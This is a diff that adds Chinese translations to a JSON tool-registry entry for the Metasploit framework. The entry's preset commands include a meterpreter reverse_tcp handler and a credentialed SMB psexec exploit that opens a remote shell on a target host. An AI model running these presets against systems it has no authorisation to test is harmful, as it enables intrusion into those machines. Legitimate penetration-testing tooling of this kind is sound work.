@@ -3,6 +3,7 @@
     "id": "metasploit-framework",
     "name": "metasploit-framework",
     "description": "World's most used penetration testing framework - exploits, payloads, post modules",
+    "descriptionI18n": { "zh": "全球使用最广的渗透测试框架 —— 集成 exploit / payload / 后渗透模块" },
     "executable": "msfconsole",
     "runtime": "ruby",
     "runtimeVersion": "3.2",
@@ -11,6 +12,7 @@
     "subcategory": "framework",
     "tier": "optional",
     "tags": ["exploit", "framework", "post-exploit", "payload"],
+    "tagsI18n": { "zh": ["漏洞利用", "框架", "后渗透", "Payload"] },
     "install": {
       "method": "homebrew",
       "source": "metasploit"
@@ -18,86 +20,116 @@
     "params": [
       {
         "label": "Resource Script",
+        "labelI18n": { "zh": "资源脚本" },
         "flag": "-r",
         "type": "string",
         "description": "Auto-run a resource script (.rc) with msf commands",
+        "descriptionI18n": { "zh": "自动运行包含 msf 命令的资源脚本(.rc)" },
         "placeholder": "auto.rc"
       },
       {
         "label": "Single Command",
+        "labelI18n": { "zh": "一次性命令" },
         "flag": "-x",
         "type": "string",
         "description": "Run msf commands then exit (semicolon separated)",
+        "descriptionI18n": { "zh": "运行 msf 命令后退出(用分号分隔)" },
         "placeholder": "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"
       },
       {
         "label": "Quiet",
+        "labelI18n": { "zh": "安静模式" },
         "flag": "-q",
         "type": "boolean",
-        "description": "No banner / less output"
+        "description": "No banner / less output",
+        "descriptionI18n": { "zh": "不显示 Banner，输出更精简" }
       },
       {
         "label": "DB Connect",
+        "labelI18n": { "zh": "数据库配置" },
         "flag": "-y",
         "type": "string",
         "description": "Database YAML config",
+        "descriptionI18n": { "zh": "数据库 YAML 配置文件" },
         "placeholder": "~/.msf4/database.yml"
       },
       {
         "label": "No DB",
+        "labelI18n": { "zh": "禁用数据库" },
         "flag": "-n",
         "type": "boolean",
-        "description": "Disable database (faster startup)"
+        "description": "Disable database (faster startup)",
+        "descriptionI18n": { "zh": "禁用数据库(启动更快)" }
       },
       {
         "label": "Logging",
+        "labelI18n": { "zh": "日志模式" },
         "flag": "-L",
         "type": "boolean",
-        "description": "Read commands from STDIN, log to STDOUT"
+        "description": "Read commands from STDIN, log to STDOUT",
+        "descriptionI18n": { "zh": "从 stdin 读命令，记录到 stdout" }
       }
     ],
     "skills": [
       {
         "id": "interactive",
         "name": "Interactive console",
+        "nameI18n": { "zh": "交互式控制台" },
         "description": "Just open msfconsole",
+        "descriptionI18n": { "zh": "直接打开 msfconsole" },
         "args": "",
-        "tags": ["interactive"]
+        "tags": ["interactive"],
+        "tagsI18n": { "zh": ["交互"] }
       },
       {
         "id": "quiet-no-db",
         "name": "Fast start (no banner, no DB)",
+        "nameI18n": { "zh": "快速启动(无 Banner / 无 DB)" },
         "description": "Quick scratch console",
+        "descriptionI18n": { "zh": "快速临时控制台" },
         "args": "-q -n",
-        "tags": ["fast"]
+        "tags": ["fast"],
+        "tagsI18n": { "zh": ["快速"] }
       },
       {
         "id": "auto-rc",
         "name": "Run resource script",
+        "nameI18n": { "zh": "运行资源脚本" },
         "description": "Replay a saved msf workflow",
+        "descriptionI18n": { "zh": "重放保存的 msf 工作流" },
         "args": "-r {{resource_script}}",
-        "tags": ["automation"]
+        "tags": ["automation"],
+        "tagsI18n": { "zh": ["自动化"] }
       },
       {
         "id": "handler",
         "name": "Spawn reverse_tcp handler",
+        "nameI18n": { "zh": "起 reverse_tcp handler" },
         "description": "One-shot multi/handler for x64 meterpreter",
+        "descriptionI18n": { "zh": "一键启动 x64 meterpreter 的 multi/handler" },
         "args": "-x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{lhost}}; set LPORT {{lport}}; set ExitOnSession false; exploit -j\"",
-        "tags": ["handler", "meterpreter"]
+        "tags": ["handler", "meterpreter"],
+        "tagsI18n": { "zh": ["Handler", "Meterpreter"] }
       },
       {
         "id": "import-nmap",
         "name": "Import nmap XML to msf DB",
+        "nameI18n": { "zh": "把 nmap XML 导入 msf 数据库" },
         "description": "Pull port/service data into msf workspace",
+        "descriptionI18n": { "zh": "把端口 / 服务数据导入到 msf workspace" },
         "args": "-x \"db_import {{nmap_xml}}; hosts; services\"",
-        "tags": ["pipeline"]
+        "tags": ["pipeline"],
+        "tagsI18n": { "zh": ["Pipeline"] }
       },
       {
         "id": "psexec-smb",
         "name": "Run psexec exploit",
+        "nameI18n": { "zh": "运行 psexec 利用" },
         "description": "Quick SMB psexec with creds",
+        "descriptionI18n": { "zh": "用凭据快速执行 SMB psexec" },
         "args": "-x \"use exploit/windows/smb/psexec; set RHOSTS {{target}}; set SMBUser {{user}}; set SMBPass {{pass}}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {{lhost}}; run\"",
-        "tags": ["smb", "windows"]
+        "tags": ["smb", "windows"],
+        "tagsI18n": { "zh": ["SMB", "Windows"] }
       }
     ],
     "output": {
